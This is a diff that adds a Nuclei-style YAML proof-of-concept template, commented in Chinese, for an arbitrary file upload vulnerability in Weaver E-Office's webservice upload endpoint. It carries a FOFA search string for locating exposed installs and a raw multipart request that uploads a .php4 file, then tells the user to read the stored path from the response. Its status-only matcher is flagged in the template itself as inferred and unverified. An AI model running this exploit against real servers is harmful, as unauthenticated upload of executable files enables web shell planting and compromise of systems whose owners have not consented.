@@ -1,0 +1,49 @@
+id: poc-qasb0qac4r1h3stn
+info:
+  name: 泛微-eoffice-webservice-file-upload任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qasb0qac4r1h3stn
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qasb0qac4r1h3stn
+    fofa: app="泛微-EOffice"
+http:
+- raw:
+  - 'POST /webservice/upload/upload.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type:multipart/form-data; boundary=--------------------------553898708333958420021355
+
+
+    ----------------------------553898708333958420021355
+
+    Content-Disposition: form-data; name="file"; filename="qq_test.php4"
+
+    Content-Type: application/octet-stream
+
+
+    qqtest
+
+    ----------------------------553898708333958420021355--
+
+
+
+    文件地址：
+
+    /attachment/{{filepath}}
+
+    filepath从响应里面获取，需要将响应中的*替换为/'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
